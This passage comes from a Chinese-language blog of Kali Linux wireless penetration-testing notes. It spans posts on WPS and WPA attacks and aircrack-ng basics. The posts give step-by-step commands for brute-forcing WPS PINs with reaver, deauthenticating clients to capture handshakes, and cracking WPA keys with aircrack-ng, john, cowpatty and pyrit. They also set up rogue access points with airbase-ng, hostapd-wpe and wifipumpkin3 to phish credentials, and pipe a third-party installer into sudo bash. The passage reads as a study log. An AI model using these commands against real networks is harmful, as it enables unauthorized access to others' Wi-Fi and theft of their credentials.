<code>airdump-ng</code>也可用于抓取wps</p></li></ul></li><li><p>爆破PIN码</p><ul><li><p><code>reaver -i wlan0 -b &lt;AP mac&gt; -vv</code>   # 直接爆破</p><p><img src="/2023/01/25/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPS%E6%94%BB%E5%87%BB/image-20230125090942801.png" alt="image-20230125090942801"></p></li><li><p>利用漏洞获取PIN码</p><ul><li><p><code>reaver -i wlan0 -b &lt;AP mac&gt; -vv -K 1</code></p><blockquote><p>reaver破解PIN码时，使用 <code>-K 1</code> 则调用命令pixiewps测试AP是否存在漏洞，存在则依据漏洞获取，否则爆破。也可以单独使用<code>pixiewps</code>命令测试，该方法只适用于固定厂商的芯片，成功率很低</p></blockquote></li></ul></li></ul></li><li><p>获取PSK</p><ul><li><p><code>reaver -i wlan0 -b &lt;AP mac&gt; -vv -p 88888888</code></p><blockquote><p>-p：指定PIN；当已经获取到PIN码之后，利用上面的命令直接获取到PSK</p></blockquote></li></ul></li></ul><p><strong>真实破解成功效果参见</strong>：<a href="https://www.cnblogs.com/qiyeboy/p/5825525.html">https://www.cnblogs.com/qiyeboy/p/5825525.html</a></p><h4 id="可能存在的问题"><a href="#可能存在的问题" class="headerlink" title="可能存在的问题"></a>可能存在的问题</h4><blockquote><ul><li>很多厂家实现了锁定机制，所以爆破时应注意<strong>限速</strong></li><li>一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定</li></ul></blockquote><h2 id="综合自动化无线密码破解工具wifite"><a href="#综合自动化无线密码破解工具wifite" class="headerlink" title="综合自动化无线密码破解工具wifite"></a>综合自动化无线密码破解工具wifite</h2><blockquote><p>可自动创建监听网卡，破解流程基本和前面的相同</p></blockquote><p><img src="/2023/01/25/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPS%E6%94%BB%E5%87%BB/image-20230125093015313.png" alt="image-20230125093015313"></p><p><img src="/2023/01/25/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPS%E6%94%BB%E5%87%BB/image-20230125093619059.png" alt="image-20230125093619059"></p><blockquote><p>先尝试Pixie-Dust攻击，若攻击不成功；会进行常规的WPS攻击（尝试11000次爆破）；若还是不成功会尝试用伪造认证方式，打掉客户端抓取四次握手包进行字典爆破。和之前使用的破解思路是相同的。</p></blockquote><h2 id="黑客攻击方式"><a href="#黑客攻击方式" class="headerlink" title="黑客攻击方式"></a>黑客攻击方式</h2><h3 id="wifipumpkin3攻击框架"><a href="#wifipumpkin3攻击框架" class="headerlink" title="wifipumpkin3攻击框架"></a>wifipumpkin3攻击框架</h3><ul><li>设置无线网卡<ul><li>set interface wlan0</li></ul></li><li>设置无线名称<ul><li>set ssid &lt;无线名称&gt;</li></ul></li><li>设置代理插件<ul><li>set proxy noproxy</li></ul></li><li>开启dns转发<ul><li>ignore pydns_server</li></ul></li><li>开启钓鱼wifi<ul><li>start</li></ul></li></ul><p><img src="/2023/01/25/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPS%E6%94%BB%E5%87%BB/image-20230126204221178.png" alt="image-20230126204221178"></p><p><img src="/2023/01/25/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPS%E6%94%BB%E5%87%BB/image-20230126204314512.png" alt="image-20230126204314512"></p><blockquote><p>由于网卡没有AP模式，无法使用wifipumpkin3进行wifi钓鱼攻击；后续更换网卡补充此内容。</p></blockquote><p>实验可见文章：<br><a href="https://www.cnblogs.com/z9m8r8/articles/16339648.html">https://www.cnblogs.com/z9m8r8/articles/16339648.html</a></p><h3 id="WPA-企业钓鱼攻击"><a href="#WPA-企业钓鱼攻击" class="headerlink" title="WPA 企业钓鱼攻击"></a>WPA 企业钓鱼攻击</h3><ul><li><p>伪造AP</p><ul><li>vim hostapd-wpe.conf</li></ul><p><img src="/2023/01/25/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPS%E6%94%BB%E5%87%BB/image-20230126205007119.png" alt="image-20230126205007119"></p></li><li><p>启动wifi</p><ul><li>hostapd-wpe hostapd-wpe.conf</li></ul></li></ul><p><img src="/2023/01/25/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPS%E6%94%BB%E5%87%BB/2379545-20220612094553139-981183934.png" alt="img"></p><blockquote><p>当用户连接时会要求输入用户名和密码进行验证，因为是假AP，所以验证不成功，但此时就可以获得challenge和response</p></blockquote><ul><li><p>asleap破解</p><ul><li><code>asleap -C &lt;challenge&gt; -R &lt;response&gt; -W /usr/share/john/password.lst</code></li></ul><p><img src="/2023/01/25/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPS%E6%94%BB%E5%87%BB/2379545-20220612110639472-1825287219.png" alt="img"></p></li></ul><blockquote><p>由于设备原因，以上两个实验未完成，后续补充</p></blockquote><p>可见文章以及图片来源：<br><a href="https://www.cnblogs.com/z9m8r8/articles/16339648.html">https://www.cnblogs.com/z9m8r8/articles/16339648.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 无线渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 无线渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-WPA攻击</title>
      <link href="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="WPA-PSK攻击"><a href="#WPA-PSK攻击" class="headerlink" title="WPA PSK攻击"></a>WPA PSK攻击</h2><blockquote><ul><li>只有一种密码破解方法<ul><li>WPA不存在WEP的弱点</li></ul></li><li>只能暴力破解<ul><li>CPU资源</li><li>时间</li><li>字典质量<ul><li>网上共享的字典</li><li>泄露密码</li><li>地区电话号码段</li><li>Crunch生成字典</li><li>Kali中自带的字典文件</li></ul></li></ul></li></ul></blockquote><p>学习资源：</p><p><a href="http://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/">http://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/</a></p><h4 id="PSK破解过程"><a href="#PSK破解过程" class="headerlink" title="PSK破解过程"></a>PSK破解过程</h4><blockquote><ul><li>启动monitor</li><li>开始抓包并保存</li><li>Deauthentication攻击获取4步握手信息（抓不到包的话打断目前存在的连接）</li><li>使用字典暴力破解</li></ul></blockquote><ul><li><p>启动monitor</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124104203676.png" alt="image-20230124104203676"></p></li><li><p>侦听周围目标</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124104859872.png" alt="image-20230124104859872"></p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124115200857.png" alt="image-20230124115200857"></p></li><li><p>抓取指定AP数据包</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124115531987.png" alt="image-20230124115531987"></p><blockquote><p>–bssid：AP的MAC；-c：11AP信道；-w：wpa抓包结果保存为wpa；</p></blockquote></li></ul><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124120856646.png" alt="image-20230124120856646"></p><blockquote><p>此时没有抓到四步握手的数据包，只能打掉客户端连接进行抓取</p></blockquote><ul><li><p>aireplay-ng -0 10 -a 50:21:EC:42:E3:80 -c DC:31:D1:9B:61:C5 wlan0</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124121346819.png" alt="image-20230124121346819"></p><blockquote><p>-0攻击包用于打掉客户端连接；-a：AP的MAC地址；-c：STA的MAC地址</p></blockquote></li><li><p>报错</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124122228092.png" alt="image-20230124122228092"></p></li></ul><blockquote><p>出现报错，wlan0工作在11信道，而AP工作在6信道；使用 <code>airodump-ng wlan0 --bssid 50:21:EC:42:E3:80 -c 6 -w wpa</code> 命令切换到6信道侦听即可</p></blockquote><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124122506787.png" alt="image-20230124122506787"></p><blockquote><p>此时已经发送了10个0号攻击包</p></blockquote><ul><li><p>抓取到握手包</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124125559806.png" alt="image-20230124125559806"></p><blockquote><p>图中红色方框部分就是抓取到握手包的标志</p></blockquote></li><li><p>暴力破解</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124125758852.png" alt="image-20230124125758852"></p><blockquote><p>这些都是抓取到无线包，其中只有<code>.cap</code>后缀的包用于<code>aircrack-ng</code>暴力破解（由于前几次抓取握手包不成功，需要多抓几次，最后一次wpa-06.cap成功抓取握手包）</p></blockquote><ul><li><p>使用<code>aircrack-ng</code>内置的字典进行暴力破解</p><ul><li>路径：<code>/usr/share/john/password.lst</code></li><li>其中想要破解的密码必须要在密码字典中，若不在密码字典中破解不出密码</li></ul></li><li><p>aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst wpa-06.cap</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124130322934.png" alt="image-20230124130322934"></p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124130339328.png" alt="image-20230124130339328"></p><blockquote><p>密码已经被爆破出来</p></blockquote></li></ul></li></ul><h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><blockquote><p>破解无线wifi可以分为以下几步：</p><p>查看网卡名：iwconfig<br>设置监听模式：airmon-ng start wlan0<br>扫描附近WIFI：airodump-ng wlan0mon<br>选定目标监听其流量：airodump-ng -w tplink -c (channel） –bssid (BSSID) wlan0mon<br>选定连接的客户端进行攻击：aireplay-ng -0 50 -a (BSSID) -c (STATION) wlan0mon<br>对抓取到的cap包进行暴力破解：aircrack-ng -w (password.txt) -b (BSSID) (xxx.cap)</p></blockquote><h3 id="Kali常用字典位置"><a href="#Kali常用字典位置" class="headerlink" title="Kali常用字典位置"></a>Kali常用字典位置</h3><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124130820819.png" alt="image-20230124130820819"></p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124130926392.png" alt="image-20230124130926392"></p><p>使用大字典进行暴力破解</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124131235711.png" alt="image-20230124131235711"></p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124131249308.png" alt="image-20230124131249308"></p><h2 id="无AP情况下的WPA密码破解"><a href="#无AP情况下的WPA密码破解" class="headerlink" title="无AP情况下的WPA密码破解"></a>无AP情况下的WPA密码破解</h2><blockquote><ul><li>启动monitor</li><li>开始抓包并保存</li><li>根据 probe 信息伪造相同ESSID的AP</li><li>抓取四步握手中的前两个包</li><li>使用字典暴力破解</li></ul></blockquote><p>原理：<br><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/2379545-20220522161234084-846682425.png" alt="img"></p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/2379545-20220522161223939-820797855.png" alt="img"></p><blockquote><p>依据目标探测的AP，我们自己伪造一个ESSID为其名的AP，然后根据WPA认证机制（上图）我们就可以知道ESSID，ANonce，SNonce，MAC1，MAC2，为此我们只有PSK不知道，但是目标会将PMK（PSK+ESSID计算得来），ANonce，SNonce，MAC1，MAC2计算的MIC和SNonce发给伪造的AP，又因相关加密算法是已知的，所以我们可以暴力枚举可能的PSK值，然后计算MIC，与目标发过来的MIC所对比，当一致时则破解成功。</p></blockquote><ul><li><p>启动wlan0的monitor模式</p></li><li><p>伪造AP</p><ul><li><p>先使用sirdump-ng抓取客户端曾经连接过的AP</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124135259858.png" alt="image-20230124135259858"></p></li><li><p>airbase-ng –essid zmr -c 6 -Z 4  wlan0</p><blockquote><p>-c指定信道，-Z代表WPA2加密，-z表示WPA1加密，不使用z &#x2F; Z参数表示open状态；4是指定CCMP加密</p></blockquote><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124135527444.png" alt="image-20230124135527444"></p></li><li><p>抓包破解</p><ul><li>airodump-ng wlan0 –essid 淡墨天羽 -w wpa -c 6</li></ul></li><li><p>之后会抓到WPA前2步的握手包，再使用aircrack-ng进行暴力破解</p><blockquote><p>这里由于设备等因素实验做得并不完备，后续补充。WPA破解思路就是这样。</p></blockquote></li></ul></li></ul><h2 id="无线密码破解工具"><a href="#无线密码破解工具" class="headerlink" title="无线密码破解工具"></a>无线密码破解工具</h2><h3 id="AIROLIB-破解密码"><a href="#AIROLIB-破解密码" class="headerlink" title="AIROLIB 破解密码"></a>AIROLIB 破解密码</h3><blockquote><p>由于PSK+ESSID计算PMK时要经过4096次的迭代计算，这使暴力破解的速度很慢，破解过程中CPU等资源消耗严重，为此我们可以事先将可能PMK计算出来，破解时再用PMK进行后续计算，这使得玻璃破解的速度会得到很大的提高，不过亦有缺点，当ESSID变动后当前的PMK又得重计算。</p><ul><li>AIROLIB破解<ul><li>设计用于存储ESSID和密码列表<ul><li>计算生成不变的PMK（计算资源消耗型）</li><li>PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）</li><li>通过完整性摘要值破解密码</li><li>SQLlite3数据库存储数据</li></ul></li></ul></li></ul></blockquote><ul><li><p>将ESSID放入一个文本文件中</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124142734819.png" alt="image-20230124142734819"></p></li><li><p>airolib-ng db –import essid essid.txt         # 导入essid</p><blockquote><p>创建一个数据库db，同时导入essid存入essid.txt</p></blockquote></li></ul><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124143038174.png" alt="image-20230124143038174"></p><ul><li><p>查看数据库状态</p><ul><li><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124143126932.png" alt="image-20230124143126932"></li></ul></li><li><p>导入密码文件</p><ul><li>airolib-ng db –import passwd &#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst</li></ul><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124143214990.png" alt="image-20230124143214990"></p></li></ul><blockquote><p>其中有些小于8个字符的密码会被剔除掉，导入数据库时会被忽略掉</p></blockquote><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124143339956.png" alt="image-20230124143339956"></p><blockquote><p>此时有653个密码被导入</p></blockquote><ul><li><p>airolib-ng  db –batch  </p><blockquote><p>生成PMK</p></blockquote><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124143501198.png" alt="image-20230124143501198"></p></li></ul><blockquote><p>此时已经就有了PMK的字典</p></blockquote><ul><li><p>使用db中的PMK值进行破解</p><ul><li>aircrack-ng -r db wpa-01.cap</li></ul><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124195132998.png" alt="image-20230124195132998"></p><blockquote><p>破解成功</p></blockquote></li></ul><h3 id="JTR-破解密码"><a href="#JTR-破解密码" class="headerlink" title="JTR 破解密码"></a>JTR 破解密码</h3><blockquote><ul><li><p>John the ripper</p><ul><li><p>快速的密码破解软件</p></li><li><p>支持基于规则动态扩展密码字典（破解时动态扩展）</p></li></ul></li><li><p>很多人喜欢用手机号码做无线密码</p><ul><li>获取号段并利用<code>JTR</code>规则增加最后几位的数字</li></ul></li><li><p>配置文件 &#x2F;etc&#x2F;john&#x2F;john.conf</p><ul><li>[list.Rules:Wordlist]    # 配置文件中存放密码规则的字段</li><li>$[0-9]$[0-9]$[0-9]$[0-9]        # 添加的规则</li></ul></li></ul></blockquote><ul><li><p>打开配置文件添加规则</p><ul><li><p>vim &#x2F;etc&#x2F;john&#x2F;john.conf</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124201352606.png" alt="image-20230124201352606"></p></li><li><p>在规则的末尾添加新规则$[0-9]$[0-9]$[0-9]$[0-9] 后保存</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124201615417.png" alt="image-20230124201615417"></p></li></ul></li><li><p>找到某个地区前七位的手机号码号段写入一个文件中</p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124201930398.png" alt="image-20230124201930398"></p></li><li><p>使用<code>john</code>生成新的完整手机号码</p><ul><li><p><code>john --wordlist=phone_num.txt --rules --stdout</code></p><blockquote><p>–wordlist：使用的那一个密码字典；–rules：对密码字典使用密码规则；–stdout：将内容全部输出出来</p></blockquote><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124202609202.png" alt="image-20230124202609202"></p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124202630066.png" alt="image-20230124202630066"></p></li></ul></li><li><p>破解</p><ul><li><p><code>john --wordlist=phone_num.txt --rules --stdout | aircrack-ng -e 淡墨天羽 -w - wpa-01.cap</code></p><blockquote><p>-w后面的<code>-</code>表示前面输出的手机号码内容（一般情况<code>-w</code>后面指定一个密码字典）</p></blockquote><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124203303481.png" alt="image-20230124203303481"></p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124203320712.png" alt="image-20230124203320712"></p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124203344612.png" alt="image-20230124203344612"></p><blockquote><p>密码最终破解不成功，JTR密码破解大概思路和操作如上</p></blockquote></li></ul></li></ul><h3 id="COWPATTY-破解密码"><a href="#COWPATTY-破解密码" class="headerlink" title="COWPATTY 破解密码"></a>COWPATTY 破解密码</h3><blockquote><p><strong>cowpatty 也是通过提前计算PMK来提升破解速度的</strong></p><ul><li>WPA密码通用破解工具</li><li>使用密码字典<ul><li>cowpatty -r wpa.cap -f password.lst -s <ESSID></ESSID></li></ul></li><li>使用彩虹表（PMK）<ul><li>genpmk -f password.lst -d pmkhash -s <ESSID>  #第三方工具生成PMK</ESSID></li><li>cowpatty -r wpa.cap -d pmkhash -s <ESSID>　　#使用PMK破解</ESSID></li></ul></li></ul></blockquote><ul><li><p>监听，抓包</p></li><li><p>破解</p><ul><li><p><code>cowpatty -r wpa-01.cap -f /usr/share/john/password.lst -s 淡墨天羽</code></p><blockquote><p>-f：指定密码文件的路径；-s：指定ESSID名称</p></blockquote><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124205034994.png" alt="image-20230124205034994"></p></li></ul></li></ul><h4 id="使用PMK破解"><a href="#使用PMK破解" class="headerlink" title="使用PMK破解"></a>使用PMK破解</h4><ul><li><p>生成PMK</p><ul><li><p><code>genpmk -f /usr/share/john/password.lst -d pmkhash -s 淡墨天羽</code> </p><blockquote><p>-d：表示生成的PMK存放在pmkhash这个文件中</p></blockquote><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124205447965.png" alt="image-20230124205447965"></p></li></ul></li><li><p>破解</p><ul><li><p><code>cowpatty -r wpa-01.cap -d pmkhash -s 淡墨天羽</code>   </p><p><img src="/2023/01/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-WPA%E6%94%BB%E5%87%BB/image-20230124205830566.png" alt="image-20230124205830566"></p><blockquote><p> 速度很快，毫秒速度破解出密码；cowpatty优势就在于先计算PMK后进行调用彩虹表破解速度提升</p></blockquote></li></ul></li></ul><h3 id="PYRIT-破解密码（推荐）"><a href="#PYRIT-破解密码（推荐）" class="headerlink" title="PYRIT 破解密码（推荐）"></a>PYRIT 破解密码（推荐）</h3><blockquote><ul><li><p>与airolib、cowpatty相同，<strong>支持基于预计算的PMK提高破解速度</strong></p></li><li><p>独有的优势</p><ul><li>除CPU之外pyrit可以运行GPU的强大运算能力加速生成PMK</li><li>本身支持抓包获取四步握手过程，无需用Airdump抓包</li><li>也支持传统的读取airodump抓包获取四步握手的方式</li></ul></li><li><p>只抓取WAP四次握手过程包</p><ul><li><code>pyrit -r wlan2mon -o wpapyrit.cap stripLive</code>    # -r 指定网卡，-o指定输出文件，striplive过滤出握手包<br><code>pyrit -r wpapyrit.cap analyze</code>　　# 对抓的握手包进行分析（AP的MAC，加密方式等）</li></ul></li><li><p>从airodump抓包导入并筛选</p><ul><li>pyrit -r wpa.cap -o wpapyrit.cap strip   # 将airodump抓的包过滤下</li></ul></li><li><p>使用密码字典直接破解</p><ul><li>pyrit -r wpaprit.cap -i password.lst -b <AP mac> attack passthrough</AP></li></ul></li><li><p>数据库模式破解</p><ul><li>默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库</li><li>查看默认数据库状态：pyrit eval</li><li>导入密码字典：pyrit -i password.lst import_passwords (会自动剔除了不合规的密码）</li><li>指定ESSID：pyrit -e zmr create_essid</li><li>计算PMK：pyrit batch (发挥GPU计算能力）</li><li>破解密码：pyrit -r wpapyrit.cap -b <AP mac> attack_db</AP></li></ul></li></ul></blockquote><blockquote><p>pyrit很老的工具了，kali中已经没有了，需要手动安装，看了很多帖子安装老报错，思路如上。</p></blockquote><p>pyrit手动安装命令：</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;hacker3983&#x2F;pyrit-installer &amp;&amp; cd pyrit-installer &amp;&amp; sudo bash install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pyrit破解文章：</p><p><a href="https://www.cnblogs.com/z9m8r8/articles/16336553.html">https://www.cnblogs.com/z9m8r8/articles/16336553.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 无线渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 无线渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-无线渗透实操</title>
      <link href="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/"/>
      <url>/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="AIRCRACK-NG基础"><a href="#AIRCRACK-NG基础" class="headerlink" title="AIRCRACK-NG基础"></a>AIRCRACK-NG基础</h2><blockquote><ul><li><p>无线渗透和审计神器   </p></li><li><p>包含各种功能的工具套件 </p><ul><li>网络检测</li><li>嗅探抓包</li><li>包注入</li><li>密码破解</li></ul></li></ul><p>无论是有线或者无线，进入内网之后的攻击方式是相同的并且攻击方式是多样的</p></blockquote><h2 id="AIRMON-NG"><a href="#AIRMON-NG" class="headerlink" title="AIRMON-NG"></a>AIRMON-NG</h2><h4 id="检查网卡驱动"><a href="#检查网卡驱动" class="headerlink" title="检查网卡驱动"></a>检查网卡驱动</h4><ul><li>airmon-ng</li></ul><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123124607375.png" alt="image-20230123124607375"></p><blockquote><p>airmon-ng列出网卡信息，Driver为驱动信息；若是驱动有问题，会出现很多难以解决的问题；Chipset为芯片型号</p></blockquote><ul><li>airmon-ng check</li></ul><blockquote><p>检查AIRCRACK套件的使用与当前系统可能存在冲突的进程，可使用 airmon-ng check kill 将其关闭。</p></blockquote><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123124926833.png" alt="image-20230123124926833"></p><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123125538644.png" alt="image-20230123125538644"></p><h4 id="开启和停止无线侦听"><a href="#开启和停止无线侦听" class="headerlink" title="开启和停止无线侦听"></a>开启和停止无线侦听</h4><ul><li>airmon-ng start wlan0</li></ul><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123130107038.png" alt="image-20230123130107038"></p><h4 id="查看当前工作信道"><a href="#查看当前工作信道" class="headerlink" title="查看当前工作信道"></a>查看当前工作信道</h4><ul><li>iwlist wlan0mon channel</li></ul><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123130141384.png" alt="image-20230123130141384"></p><blockquote><p>图中显示当前工作在10信道；可以使用”airmon-ng start wlan0 1&#x2F;2&#x2F;3……”修改工作的信道</p></blockquote><h2 id="Airodump-ng"><a href="#Airodump-ng" class="headerlink" title="Airodump-ng"></a>Airodump-ng</h2><blockquote><p>airodump-ng无线抓包套件之一</p></blockquote><ul><li>airodump-ng wlan0mon</li></ul><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123131118294.png" alt="image-20230123131118294"></p><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123131146747.png" alt="image-20230123131146747"></p><blockquote><p>使用airodump-ng抓包的话，此时无线网卡工作在所有信道中进行轮询，每个信道进行监听发现是否存在AP</p></blockquote><ul><li><p>airodump-ng wlan0mon -c 1</p><blockquote><p>指定信道进行侦听</p></blockquote></li></ul><p><img src="/2023/01/23/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%AE%9E%E6%93%8D/image-20230123131819870.png" alt="image-20230123131819870"></p><p><img 